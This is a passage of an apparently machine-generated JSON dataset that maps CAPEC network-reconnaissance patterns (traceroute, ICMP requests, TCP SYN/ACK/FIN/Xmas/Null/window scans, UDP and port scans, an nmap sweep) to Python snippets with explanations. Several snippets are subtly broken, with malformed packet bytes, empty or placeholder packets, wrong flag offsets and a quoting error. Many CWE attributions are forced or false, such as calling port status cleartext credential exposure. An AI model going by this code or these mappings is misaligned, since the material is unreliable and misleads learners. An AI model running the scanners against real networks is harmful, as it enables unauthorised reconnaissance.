        "code_snippet": "import socket\nimport struct\nimport time\n\n# Function to perform traceroute\ndef traceroute(dest_name, max_hops=30, timeout=2):\n    dest_addr = socket.gethostbyname(dest_name)\n    port = 33434\n    ttl = 1\n\n    while ttl <= max_hops:\n        recv_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n        send_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)\n        send_socket.setsockopt(socket.SOL_IP, socket.IP_TTL, ttl)\n        recv_socket.settimeout(timeout)\n        recv_socket.bind(('', port))\n\n        start_time = time.time()\n        send_socket.sendto(b'', (dest_name, port))\n\n        try:\n            data, curr_addr = recv_socket.recvfrom(512)\n            curr_addr = curr_addr[0]\n            elapsed_time = (time.time() - start_time) * 1000\n            print(f'{ttl}\t{curr_addr}\t{elapsed_time:.2f} ms')\n        except socket.error:\n            print(f'{ttl}\t*\tRequest timed out.')\n        finally:\n            send_socket.close()\n            recv_socket.close()\n\n        ttl += 1\n        if curr_addr == dest_addr:\n            break\n\nif __name__ == '__main__':\n    traceroute('example.com')",
        "description": "This Python code snippet performs a traceroute to a specified destination (in this case, 'example.com'). It sends UDP packets with incrementing TTL values to map out the route data takes through the network. The code captures ICMP messages from each hop, revealing the intermediate routers and their response times. This process can expose sensitive network topology information (CWE-200, CWE-497) and potentially transmit this data in cleartext (CWE-319). The code demonstrates how an adversary might use traceroute to gather network information, aligning with the CAPEC description of 'Traceroute Route Enumeration'."
    },
    {
        "capec_id": "294",
        "capec_name": "ICMP Address Mask Request",
        "code_snippet": "import socket\n\n# Create a raw socket to send ICMP packets\nsock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n\n# ICMP Address Mask Request (Type 17, Code 0)\nicmp_packet = b'\\x11\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n\n# Target IP address\ntarget_ip = '192.168.1.1'\n\n# Send the ICMP Address Mask Request\nsock.sendto(icmp_packet, (target_ip, 0))\n\n# Receive the ICMP Address Mask Reply\nresponse, _ = sock.recvfrom(1024)\n\n# Extract and print the address mask from the response\naddress_mask = response[20:24]\nprint(f'Address Mask: {\".\".join(map(str, address_mask))}')",
        "description": "This Python code snippet demonstrates how an adversary might send an ICMP Address Mask Request (Type 17) to a target IP address to gather information about the target's networking configuration. The code creates a raw socket to send and receive ICMP packets, constructs an ICMP Address Mask Request packet, and sends it to the target IP. It then waits for an ICMP Address Mask Reply (Type 18) and extracts the address mask from the response. This type of information can be used by an attacker to plan further network-based attacks. The code also highlights vulnerabilities such as exposure of sensitive information (CWE-200), reliance on IP address for authentication (CWE-291), and improper restriction of communication channels (CWE-923)."
    },
    {
        "capec_id": "295",
        "capec_name": "Timestamp Request",
        "code_snippet": "import requests\n\n# Vulnerable endpoint that returns the server's current timestamp\nurl = 'http://example.com/get-timestamp'\n\n# Send a GET request to the endpoint\nresponse = requests.get(url)\n\n# Extract the timestamp from the response\nif response.status_code == 200:\n    timestamp = response.text\n    print(f'Server timestamp: {timestamp}')\nelse:\n    print('Failed to retrieve timestamp')",
        "description": "This Python code snippet demonstrates a vulnerable endpoint that exposes the server's current timestamp via an HTTP GET request. The code sends a GET request to a specified URL and prints the server's timestamp if the request is successful. This example embodies the 'Timestamp Request' CAPEC by showing how an attacker could retrieve the server's timestamp, which could then be used to exploit time-based security mechanisms. The related CWEs are represented as follows: CWE-200 (Exposure of Sensitive Information) is shown by the server exposing its timestamp, CWE-208 (Observable Timing Discrepancy) is implied by the potential for timing attacks, CWE-385 (Covert Timing Channel) is suggested by the possibility of inferring protected information through timing, CWE-294 (Authentication Bypass by Capture-replay) is relevant if the timestamp is used in authentication, and CWE-598 (Use of GET Request Method With Sensitive Query Strings) is demonstrated by using a GET request to retrieve sensitive information."
    },
    {
        "capec_id": "296",
        "capec_name": "ICMP Information Request",
        "code_snippet": "import socket\n\n# Create a raw socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n\n# ICMP Information Request packet (Type 15, Code 0)\nicmp_packet = b'\\x0f\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n\n# Target IP address\ntarget_ip = '192.168.1.1'\n\n# Send the ICMP Information Request\nsock.sendto(icmp_packet, (target_ip, 0))\n\n# Receive the response\nresponse, addr = sock.recvfrom(1024)\n\n# Print the response\nprint(f'Received response from {addr}: {response}')",
        "description": "This Python code snippet demonstrates how an adversary might send an ICMP Information Request (Type 15, Code 0) to a target host to check if it responds to this deprecated mechanism. The code creates a raw socket, constructs an ICMP Information Request packet, and sends it to the specified target IP address. It then waits for a response and prints it. This action can expose sensitive system information (CWE-200, CWE-497) and may involve cleartext transmission of sensitive data (CWE-319). The code represents the main idea of the CAPEC by illustrating how deprecated protocols can be exploited to gather information about a target system."
    },
    {
        "capec_id": "297",
        "capec_name": "TCP ACK Ping",
        "code_snippet": "import socket\n\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-605: Multiple Binds to the Same Port\n\ndef tcp_ack_ping(target_ip, target_port):\n    try:\n        # Create a raw socket\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n\n        # Construct the TCP ACK packet\n        packet = b''\n        # IP header fields (simplified)\n        packet += b'\\x45\\x00\\x00\\x28'  # Version, IHL, Type of Service | Total Length\n        packet += b'\\xab\\xcd\\x00\\x00'  # Identification | Flags, Fragment Offset\n        packet += b'\\x40\\x06\\x00\\x00'  # TTL, Protocol (TCP) | Header Checksum\n        packet += socket.inet_aton('192.168.1.100')  # Source IP (spoofed)\n        packet += socket.inet_aton(target_ip)  # Destination IP\n\n        # TCP header fields (simplified)\n        packet += b'\\x00\\x50'  # Source Port (80)\n        packet += target_port.to_bytes(2, 'big')  # Destination Port\n        packet += b'\\x00\\x00\\x00\\x00'  # Sequence Number\n        packet += b'\\x00\\x00\\x00\\x00'  # Acknowledgment Number\n        packet += b'\\x50\\x10\\x00\\x00'  # Data Offset, Reserved, Flags (ACK) | Window Size\n        packet += b'\\x00\\x00\\x00\\x00'  # Checksum | Urgent Pointer\n\n        # Send the packet\n        sock.sendto(packet, (target_ip, 0))\n\n        # Receive the response\n        response = sock.recv(1024)\n        if response:\n            print(f'Received response from {target_ip}')\n    except Exception as e:\n        print(f'Error: {e}')\n    finally:\n        sock.close()\n\n# Example usage\nif __name__ == '__main__':\n    tcp_ack_ping('192.168.1.1', 80)\n",
        "description": "This Python code snippet demonstrates a TCP ACK Ping, which is used to determine if a remote host is alive by sending a TCP segment with the ACK flag set. The code creates a raw socket and constructs a simplified TCP ACK packet with spoofed source IP and specified target IP and port. It then sends the packet and waits for a response. If a response is received, it indicates that the host is alive. This code embodies the main idea of the CAPEC by using the TCP ACK Ping technique. Additionally, it touches on related CWEs: CWE-319 (Cleartext Transmission of Sensitive Information) as the packet is sent in cleartext, CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) as the response reveals the host's status, and CWE-605 (Multiple Binds to the Same Port) as the raw socket could interfere with other services on the same port."
    },
    {
        "capec_id": "298",
        "capec_name": "UDP Ping",
        "code_snippet": "import socket\n\n# Create a UDP socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\nsock.settimeout(2)\n\n# Target IP and a high random port\ntarget_ip = '192.168.1.1'\ntarget_port = 65535\n\n# Send a UDP packet to the target\ntry:\n    sock.sendto(b'', (target_ip, target_port))\n    # Wait for an ICMP 'port unreachable' response\n    data, addr = sock.recvfrom(1024)\n    print(f'Received response from {addr}')\nexcept socket.timeout:\n    print('No response received')\nexcept Exception as e:\n    print(f'Error: {e}')\nfinally:\n    sock.close()",
        "description": "This Python code snippet demonstrates a UDP ping to a high random port (65535) on a target IP address (192.168.1.1). The goal is to solicit an 'ICMP port unreachable' message from the target, indicating that the host is alive. The code creates a UDP socket, sends an empty UDP packet to the target, and waits for a response. If no response is received within the timeout period, it prints 'No response received'. This code embodies the main idea of the CAPEC 'UDP Ping' by attempting to determine if a host is alive through UDP communication. The related CWEs are represented by the potential exposure of sensitive information (CWE-200), incorrect destination specification (CWE-941), and improper protection for outbound error messages (CWE-1320)."
    },
    {
        "capec_id": "299",
        "capec_name": "TCP SYN Ping",
        "code_snippet": "import socket\n\n# Function to perform TCP SYN Ping\ndef tcp_syn_ping(target_ip, target_port):\n    try:\n        # Create a raw socket\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n        sock.settimeout(1)\n\n        # Construct a TCP SYN packet\n        packet = b'\\x45\\x00\\x00\\x3c\\x1c\\x46\\x40\\x00\\x40\\x06\\xb1\\xe6'  # IP header\n        packet += b'\\x0a\\x00\\x00\\x01'  # Source IP\n        packet += socket.inet_aton(target_ip)  # Destination IP\n        packet += b'\\x00\\x50\\x00\\x50\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'  # TCP header\n        packet += b'\\x50\\x02\\x20\\x00\\x72\\x10\\x00\\x00'  # SYN flag\n\n        # Send the packet\n        sock.sendto(packet, (target_ip, target_port))\n\n        # Receive the response\n        response = sock.recv(1024)\n\n        # Check if the response is SYN/ACK or RST\n        if response[13] == 0x12:  # SYN/ACK\n            print(f\"Port {target_port} on {target_ip} is open.\")\n        elif response[13] == 0x14:  # RST\n            print(f\"Port {target_port} on {target_ip} is closed.\")\n        else:\n            print(f\"Unexpected response from {target_ip}:{target_port}\")\n    except socket.timeout:\n        print(f\"No response from {target_ip}:{target_port}\")\n    except Exception as e:\n        print(f\"Error: {e}\")\n    finally:\n        sock.close()\n\n# Example usage\nif __name__ == '__main__':\n    target_ip = '192.168.1.1'\n    target_port = 80\n    tcp_syn_ping(target_ip, target_port)\n",
        "description": "This Python code snippet demonstrates a TCP SYN Ping, which is used for host discovery by sending a TCP SYN packet to a specified IP and port. The code creates a raw socket and constructs a TCP SYN packet. It then sends the packet to the target and waits for a response. If a SYN/ACK packet is received, it indicates that the port is open. If a RST packet is received, it indicates that the port is closed. This behavior is based on the RFC 793 specification. The code also handles potential errors and timeouts. This example embodies the CAPEC concept of using TCP SYN packets for host discovery and highlights potential vulnerabilities such as exposure of sensitive information (CWE-200) and cleartext transmission (CWE-319)."
    },
    {
        "capec_id": "300",
        "capec_name": "Port Scanning",
        "code_snippet": "import socket\n\n# Vulnerable code that exposes sensitive information and allows port scanning\n\ndef check_open_ports(ip, ports):\n    open_ports = []\n    for port in ports:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.settimeout(1)\n        try:\n            s.connect((ip, port))\n            open_ports.append(port)\n        except socket.error:\n            pass\n        s.close()\n    return open_ports\n\n# Example usage\nip_address = '192.168.1.1'\nports_to_check = [21, 22, 80, 443]\nopen_ports = check_open_ports(ip_address, ports_to_check)\nprint(f'Open ports on {ip_address}: {open_ports}')\n\n# Exposing sensitive information\nif open_ports:\n    print(f'Sensitive information: Open ports on {ip_address} are {open_ports}')\n\n# Cleartext transmission of sensitive information\nsensitive_data = 'username:password'\nprint(f'Transmitting sensitive data: {sensitive_data}')",
        "description": "This Python code snippet demonstrates a basic port scanning functionality, which is the main idea of the CAPEC. The function `check_open_ports` attempts to connect to a list of specified ports on a given IP address and returns a list of open ports. This can be used by an adversary to determine the state of the ports on a remote target. The code also includes examples of related CWEs: it prints sensitive information about open ports (CWE-200), and it transmits sensitive data in cleartext (CWE-319). This snippet highlights the potential vulnerabilities and risks associated with port scanning and improper handling of sensitive information."
    },
    {
        "capec_id": "301",
        "capec_name": "TCP Connect Scan",
        "code_snippet": "import socket\n\n# CWE-291: Reliance on IP Address for Authentication\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-605: Multiple Binds to the Same Port\n# CWE-617: Reachable Assertion\n# CWE-353: Missing Support for Integrity Check\n\ndef tcp_connect_scan(target_ip, target_port):\n    try:\n        # Create a socket object\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(1)\n        \n        # Attempt to connect to the target IP and port\n        result = sock.connect_ex((target_ip, target_port))\n        \n        if result == 0:\n            print(f\"Port {target_port} is open on {target_ip}\")\n        else:\n            print(f\"Port {target_port} is closed on {target_ip}\")\n        \n        sock.close()\n    except Exception as e:\n        print(f\"Error: {e}\")\n\n# Example usage\n# This is a vulnerable code snippet as it exposes sensitive information\n# and relies on IP address for authentication\nif __name__ == \"__main__\":\n    target_ip = \"192.168.1.1\"\n    target_port = 80\n    tcp_connect_scan(target_ip, target_port)\n",
        "description": "This Python code snippet demonstrates a TCP connect scan, which is used to determine if a specific port on a target system is open. The function `tcp_connect_scan` attempts to establish a full TCP connection (three-way handshake) with the target IP and port. If the connection is successful, it reports the port as open; otherwise, it reports the port as closed. The code embodies the main idea of the CAPEC by performing a TCP connect scan. It also highlights several related CWEs: reliance on IP address for authentication (CWE-291), exposure of sensitive information (CWE-200), potential for multiple binds to the same port (CWE-605), reachable assertion (CWE-617), and missing support for integrity check (CWE-353). The code is vulnerable as it exposes sensitive information about the port status and relies on IP address for authentication."
    },
    {
        "capec_id": "302",
        "capec_name": "TCP FIN Scan",
        "code_snippet": "import socket\n\ndef tcp_fin_scan(target_ip, target_port):\n    try:\n        # Create a raw socket\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n\n        # Construct the TCP packet with FIN flag set\n        packet = b''\n        # IP header fields (simplified)\n        packet += b'\\x45\\x00\\x00\\x28'  # Version, IHL, Type of Service | Total Length\n        packet += b'\\xab\\xcd\\x00\\x00'  # Identification | Flags, Fragment Offset\n        packet += b'\\x40\\x06\\x00\\x00'  # TTL, Protocol | Header Checksum\n        packet += socket.inet_aton('192.168.1.1')  # Source IP (example)\n        packet += socket.inet_aton(target_ip)  # Destination IP\n        # TCP header fields (simplified)\n        packet += b'\\x00\\x50'  # Source Port (example)\n        packet += target_port.to_bytes(2, 'big')  # Destination Port\n        packet += b'\\x00\\x00\\x00\\x00'  # Sequence Number\n        packet += b'\\x00\\x00\\x00\\x00'  # Acknowledgment Number\n        packet += b'\\x50\\x01\\x00\\x00'  # Data Offset, Reserved, Flags (FIN) | Window\n        packet += b'\\x00\\x00\\x00\\x00'  # Checksum | Urgent Pointer\n\n        # Send the packet\n        sock.sendto(packet, (target_ip, 0))\n\n        # Receive the response\n        response = sock.recv(1024)\n        if response[33] == 0x14:  # Check if RST flag is set in the response\n            print(f'Port {target_port} is closed.')\n        else:\n            print(f'Port {target_port} is open or filtered.')\n    except Exception as e:\n        print(f'Error: {e}')\n    finally:\n        sock.close()\n\n# Example usage\ntcp_fin_scan('192.168.1.2', 80)",
        "description": "This Python code snippet demonstrates a TCP FIN scan, which is used to determine if a port on a target machine is closed. The code creates a raw socket and constructs a TCP packet with the FIN flag set. It sends this packet to the target IP and port, then listens for a response. If a TCP RST (reset) packet is received, it indicates that the port is closed. This behavior leverages the expected RFC 793 behavior where out-of-state TCP segments sent to closed ports elicit a RST response. The code also touches on related CWEs by showing how sensitive information (port status) can be exposed to unauthorized actors (CWE-200), and how the lack of proper integrity checks (CWE-353) and improper restriction of communication channels (CWE-923) can be exploited in network protocols."
    },
    {
        "capec_id": "303",
        "capec_name": "TCP Xmas Scan",
        "code_snippet": "import socket\n\n# Function to perform TCP Xmas Scan\ndef tcp_xmas_scan(target_ip, target_port):\n    # Create a raw socket\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n\n    # Construct the TCP packet with all flags set (Xmas Tree Packet)\n    packet = b''\n    # IP Header (20 bytes)\n    packet += b'\\x45\\x00\\x00\\x28'  # Version, IHL, Type of Service | Total Length\n    packet += b'\\xab\\xcd\\x00\\x00'  # Identification | Flags, Fragment Offset\n    packet += b'\\x40\\x06\\x00\\x00'  # TTL, Protocol (TCP) | Header Checksum\n    packet += socket.inet_aton('192.168.1.1')  # Source IP (example)\n    packet += socket.inet_aton(target_ip)  # Destination IP\n    # TCP Header (20 bytes)\n    packet += b'\\x00\\x50'  # Source Port (example)\n    packet += target_port.to_bytes(2, 'big')  # Destination Port\n    packet += b'\\x00\\x00\\x00\\x00'  # Sequence Number\n    packet += b'\\x00\\x00\\x00\\x00'  # Acknowledgment Number\n    packet += b'\\x50\\xff\\xff\\xff'  # Data Offset, Reserved, Flags (all set)\n    packet += b'\\x00\\x00\\x00\\x00'  # Window Size | Checksum | Urgent Pointer\n\n    # Send the packet\n    sock.sendto(packet, (target_ip, 0))\n\n    # Receive the response\n    try:\n        response = sock.recv(1024)\n        if response:\n            print(f'Received response from {target_ip}:{target_port}')\n    except socket.timeout:\n        print(f'No response from {target_ip}:{target_port}')\n\n# Example usage\nif __name__ == '__main__':\n    target_ip = '192.168.1.2'  # Target IP (example)\n    target_port = 80  # Target Port (example)\n    tcp_xmas_scan(target_ip, target_port)",
        "description": "This Python code snippet demonstrates a TCP Xmas scan, which is used to determine if ports are closed on a target machine. The scan sends TCP segments with all possible flags set in the packet header, creating illegal packets according to RFC 793. The expected behavior is that closed ports respond with a RST packet, while open ports do not respond. The code constructs a raw TCP packet with all flags set, sends it to the target IP and port, and listens for a response. If a response is received, it indicates the port is closed. This scan can expose sensitive information about the target's network configuration (CWE-200) and relies on the improper handling of TCP flags (CWE-923)."
    },
    {
        "capec_id": "304",
        "capec_name": "TCP Null Scan",
        "code_snippet": "import socket\n\n# Function to perform TCP NULL scan\ndef tcp_null_scan(target_ip, target_port):\n    try:\n        # Create a raw socket\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n        sock.settimeout(1)\n\n        # Construct a TCP packet with no flags set (NULL scan)\n        packet = b''\n        sock.sendto(packet, (target_ip, target_port))\n\n        # Receive response\n        response = sock.recvfrom(1024)\n        if response:\n            print(f'Port {target_port} is closed on {target_ip}')\n    except socket.error as e:\n        print(f'Socket error: {e}')\n    except Exception as e:\n        print(f'Error: {e}')\n    finally:\n        sock.close()\n\n# Example usage\nif __name__ == '__main__':\n    target_ip = '192.168.1.1'\n    target_port = 80\n    tcp_null_scan(target_ip, target_port)",
        "description": "This Python code snippet demonstrates a TCP NULL scan, which is used to determine if a port is closed on a target machine. The code creates a raw socket and sends a TCP packet with no flags set to the specified target IP and port. If a response is received, it indicates that the port is closed. This behavior is based on the RFC 793 specification, where closed ports respond with a RST packet to out-of-state TCP segments. The code also includes error handling for socket errors and other exceptions. This example embodies the main idea of the CAPEC by illustrating how an adversary can use TCP NULL scans to identify closed ports. Additionally, it touches on related CWEs such as exposure of sensitive information (CWE-200) and unchecked return values (CWE-690)."
    },
    {
        "capec_id": "305",
        "capec_name": "TCP ACK Scan",
        "code_snippet": "import socket\n\n# Function to perform TCP ACK scan\ndef tcp_ack_scan(target_ip, target_port):\n    try:\n        # Create a raw socket\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n\n        # Construct TCP ACK packet\n        packet = b''\n        # IP header fields\n        packet += b'\\x45\\x00\\x00\\x28'  # Version, IHL, Type of Service | Total Length\n        packet += b'\\xab\\xcd\\x00\\x00'  # Identification | Flags, Fragment Offset\n        packet += b'\\x40\\x06\\x00\\x00'  # TTL, Protocol | Header Checksum\n        packet += socket.inet_aton('192.168.1.100')  # Source IP\n        packet += socket.inet_aton(target_ip)  # Destination IP\n\n        # TCP header fields\n        packet += b'\\x00\\x50'  # Source Port\n        packet += target_port.to_bytes(2, 'big')  # Destination Port\n        packet += b'\\x00\\x00\\x00\\x00'  # Sequence Number\n        packet += b'\\x00\\x00\\x00\\x00'  # Acknowledgment Number\n        packet += b'\\x50\\x10\\x00\\x00'  # Data Offset, Reserved, Flags | Window Size\n        packet += b'\\x00\\x00\\x00\\x00'  # Checksum | Urgent Pointer\n\n        # Send the packet\n        sock.sendto(packet, (target_ip, 0))\n        print(f\"Sent TCP ACK packet to {target_ip}:{target_port}\")\n    except Exception as e:\n        print(f\"Error: {e}\")\n\n# Example usage\nif __name__ == '__main__':\n    tcp_ack_scan('192.168.1.1', 80)",
        "description": "This Python code snippet demonstrates a basic TCP ACK scan, which is used to gather information about firewall or ACL configurations. The code creates a raw socket and constructs a TCP ACK packet with hardcoded IP and TCP header fields. It then sends the packet to a specified target IP and port. This type of scan can help identify how a firewall handles ACK packets, providing insights into the firewall rules. The code also highlights potential vulnerabilities such as exposure of sensitive information (CWE-200) and cleartext transmission (CWE-319) by sending raw packets without encryption."
    },
    {
        "capec_id": "306",
        "capec_name": "TCP Window Scan",
        "code_snippet": "import socket\n\ndef tcp_window_scan(target_ip, target_port):\n    try:\n        # Create a raw socket\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n        sock.settimeout(1)\n\n        # Send a TCP packet with ACK flag set\n        packet = create_tcp_packet(target_ip, target_port)\n        sock.sendto(packet, (target_ip, target_port))\n\n        # Receive the response\n        response = sock.recvfrom(1024)[0]\n        window_size = extract_window_size(response)\n\n        if window_size > 0:\n            print(f\"Port {target_port} is open on {target_ip}\")\n        else:\n            print(f\"Port {target_port} is closed on {target_ip}\")\n    except Exception as e:\n        print(f\"Error: {e}\")\n\n\ndef create_tcp_packet(target_ip, target_port):\n    # This function should create a TCP packet with the ACK flag set\n    # For simplicity, this is a placeholder\n    return b''\n\n\ndef extract_window_size(response):\n    # This function should extract the TCP window size from the response\n    # For simplicity, this is a placeholder\n    return 0\n\n# Example usage\nif __name__ == '__main__':\n    tcp_window_scan('192.168.1.1', 80)",
        "description": "This Python code snippet demonstrates a basic implementation of a TCP Window Scan, which is used to infer the status of a port and potentially the operating system type based on the TCP window size field in RST packets. The code creates a raw socket, sends a TCP packet with the ACK flag set to the target IP and port, and then analyzes the response to determine the window size. If the window size is positive, it infers that the port is open; otherwise, it infers that the port is closed. This scan technique can expose sensitive information (CWE-200, CWE-497) and is vulnerable to interception if transmitted in cleartext (CWE-319). The code also lacks integrity checks (CWE-353) and could be used in covert timing channels (CWE-385)."
    },
    {
        "capec_id": "307",
        "capec_name": "TCP RPC Scan",
        "code_snippet": "import socket\n\n# Vulnerable code: Exposes sensitive information and allows multiple binds to the same port\nHOST = '0.0.0.0'  # Listen on all interfaces\nPORT = 111  # Common port for RPC services\n\n# Create a socket\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# Allow multiple binds to the same port (CWE-605)\nserver_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n\n# Bind the socket to the address and port\nserver_socket.bind((HOST, PORT))\n\n# Listen for incoming connections\nserver_socket.listen(5)\nprint(f'Listening on {HOST}:{PORT}')\n\nwhile True:\n    client_socket, addr = server_socket.accept()\n    print(f'Connection from {addr}')\n    # Expose sensitive information (CWE-200)\n    client_socket.send(b'Sensitive information: RPC service running')\n    client_socket.close()",
        "description": "This Python code snippet demonstrates a vulnerable TCP RPC service that listens on all interfaces (0.0.0.0) and a common RPC port (111). The code allows multiple binds to the same port (CWE-605), which can lead to port hijacking or service spoofing. Additionally, it exposes sensitive information (CWE-200) by sending a message to any connected client indicating that an RPC service is running. This setup can be exploited by an adversary scanning for RPC services on a Unix/Linux host, as described in the CAPEC."
    },
    {
        "capec_id": "308",
        "capec_name": "UDP Scan",
        "code_snippet": "import socket\n\n# Function to perform UDP scan\ndef udp_scan(target_ip, target_port):\n    try:\n        # Create a UDP socket\n        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        sock.settimeout(1)\n\n        # Send a UDP packet to the target port\n        sock.sendto(b'', (target_ip, target_port))\n\n        try:\n            # Try to receive a response\n            data, _ = sock.recvfrom(1024)\n            print(f'Port {target_port} is open or filtered')\n        except socket.timeout:\n            print(f'Port {target_port} is open or filtered (no response)')\n        except Exception as e:\n            print(f'Error: {e}')\n    except Exception as e:\n        print(f'Failed to send UDP packet: {e}')\n    finally:\n        sock.close()\n\n# Example usage\nudp_scan('192.168.1.1', 53)",
        "description": "This Python code snippet demonstrates a basic UDP scan to determine the status of a UDP port on a target system. The function `udp_scan` creates a UDP socket and sends an empty UDP datagram to the specified target IP and port. It then waits for a response to determine if the port is open or filtered. If no response is received within the timeout period, it assumes the port is open or filtered. This code embodies the main idea of the CAPEC 'UDP Scan' by attempting to gather information about the status of UDP ports. The related CWEs are represented in the context of potential vulnerabilities: the code does not handle sensitive information securely (CWE-200, CWE-319), does not verify data integrity (CWE-353), and could be used to infer information through timing (CWE-385)."
    },
    {
        "capec_id": "309",
        "capec_name": "Network Topology Mapping",
        "code_snippet": "import os\nimport subprocess\n\ndef network_topology_mapping():\n    # Using a simple ICMP ping scan to map network nodes\n    ip_range = '192.168.1.0/24'\n    try:\n        # This command can expose sensitive network information\n        result = subprocess.check_output(['nmap', '-sn', ip_range], stderr=subprocess.STDOUT)\n        print(result.decode('utf-8'))\n    except subprocess.CalledProcessError as e:\n        print(f'Error during network scan: {e.output.decode('utf-8')}')\n\nif __name__ == '__main__':\n    network_topology_mapping()",
        "description": "This Python code snippet demonstrates a basic network topology mapping using the 'nmap' tool to perform an ICMP ping scan over a specified IP range. The code captures the output of the scan, which can reveal sensitive network information such as active hosts and their IP addresses. This embodies the CAPEC concept of 'Network Topology Mapping' by showing how an adversary might use scanning tools to gather information about a network. The code also touches on related CWEs by potentially exposing sensitive system information (CWE-497) and having an excessive attack surface (CWE-1125) due to the use of external commands and the handling of their outputs."
    },
    {
        "capec_id": "310",
        "capec_name": "Scanning for Vulnerable Software",
        "code_snippet": "import socket\n\n# Function to scan for open ports\ndef scan_ports(ip, ports):\n    open_ports = []\n    for port in ports:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(1)\n        result = sock.connect_ex((ip, port))\n        if result == 0:\n            open_ports.append(port)\n        sock.close()\n    return open_ports\n\n# Function to check for vulnerable services\ndef check_vulnerable_services(ip, open_ports):\n    vulnerable_services = {}\n    for port in open_ports:\n        if port == 21:  # FTP\n            vulnerable_services[port] = 'FTP'\n        elif port == 23:  # Telnet\n            vulnerable_services[port] = 'Telnet'\n        elif port == 25:  # SMTP\n            vulnerable_services[port] = 'SMTP'\n        elif port == 161:  # SNMP\n            vulnerable_services[port] = 'SNMP'\n    return vulnerable_services\n\n# Example usage\nip_address = '192.168.1.1'\nports_to_scan = [21, 23, 25, 80, 161]\nopen_ports = scan_ports(ip_address, ports_to_scan)\nvulnerable_services = check_vulnerable_services(ip_address, open_ports)\n\nprint(f\"Open Ports: {open_ports}\")\nprint(f\"Vulnerable Services: {vulnerable_services}\")",
        "description": "This Python code snippet demonstrates a basic port scanning and service identification process, which aligns with the CAPEC description of 'Scanning for Vulnerable Software'. The `scan_ports` function scans a given IP address for open ports from a specified list. The `check_vulnerable_services` function then checks these open ports against a list of known vulnerable services (FTP, Telnet, SMTP, SNMP). The code highlights the potential exposure of sensitive system information (CWE-497) and the risk of excessive attack surface (CWE-1125) by identifying open ports and associated services that could be exploited if not properly secured."
    },
    {
        "capec_id": "311",
        "capec_name": "DEPRECATED: OS Fingerprinting",
        "code_snippet": "import os\nimport platform\n\n# Function to perform active OS fingerprinting\n# This is a simplified example and should not be used in production\n\ndef active_os_fingerprinting():\n    os_info = platform.uname()\n    print(f\"System: {os_info.system}\")\n    print(f\"Node Name: {os_info.node}\")\n    print(f\"Release: {os_info.release}\")\n    print(f\"Version: {os_info.version}\")\n    print(f\"Machine: {os_info.machine}\")\n    print(f\"Processor: {os_info.processor}\")\n\n# Function to simulate a call to a non-ubiquitous API\n# This could cause portability issues\n\ndef call_non_ubiquitous_api():\n    if os.name == 'posix':\n        os.system('uname -a')  # This command is not available on all platforms\n    else:\n        print(\"Non-POSIX system detected. Command not available.\")\n\n# Function to simulate improper access control to debug interface\n# This is a simplified example and should not be used in production\n\ndef improper_debug_access():\n    debug_mode = True  # Simulating a debug mode flag\n    if debug_mode:\n        print(\"Accessing debug interface...\")\n        # Simulate access to internal registers\n        print(\"Internal Register Value: 0xDEADBEEF\")\n    else:\n        print(\"Access denied to debug interface.\")\n\n# Main function to demonstrate the vulnerabilities\n\ndef main():\n    print(\"Performing Active OS Fingerprinting...\")\n    active_os_fingerprinting()\n    print(\"\\nCalling Non-Ubiquitous API...\")\n    call_non_ubiquitous_api()\n    print(\"\\nImproper Debug Access...\")\n    improper_debug_access()\n\nif __name__ == '__main__':\n    main()",
        "description": "This Python code snippet demonstrates several security vulnerabilities related to OS fingerprinting and improper access control. The `active_os_fingerprinting` function collects and prints system information, which can be used for OS fingerprinting (CAPEC-312). The `call_non_ubiquitous_api` function simulates a call to a non-ubiquitous API, which can cause portability issues (CWE-589). The `improper_debug_access` function simulates improper access control to a debug interface, allowing unauthorized access to internal registers (CWE-1191). The `main` function orchestrates these actions, showcasing the potential security risks."
    },
    {
        "capec_id": "312",
        "capec_name": "Active OS Fingerprinting",
